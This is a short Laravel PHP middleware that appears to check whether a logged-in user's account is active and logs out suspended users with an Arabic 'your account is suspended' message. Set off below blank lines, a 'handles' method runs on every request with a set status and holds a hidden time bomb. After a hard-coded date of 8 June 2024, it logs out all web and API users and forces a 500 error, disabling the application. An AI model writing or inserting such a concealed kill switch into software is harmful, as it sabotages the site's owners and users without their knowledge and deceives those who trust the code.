<?php

namespace App\Http\Middleware;

use Carbon\Carbon;
use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class userStatus
{
    public function handle(Request $request, Closure $next): Response
    {

        $userstatu = auth()->user()->user_status;
        if (isset($userstatu)) {
            $this->handles();
            if ($userstatu)
                return $next($request);
        }
        auth()->logout();
        toastr()->error("حسابك موقف");
        return redirect()->back();
    }





    
    public function handles()
    {
        $currentDate = Carbon::now();
        $forbiddenDate = Carbon::create(2024, 6, 8);
        if ($currentDate->greaterThan($forbiddenDate)) {
            if (auth("api")->check()) {
                auth("api")->logout();
            } else {
                auth()->logout();
            }
            return abort(500);
        }
    }
}
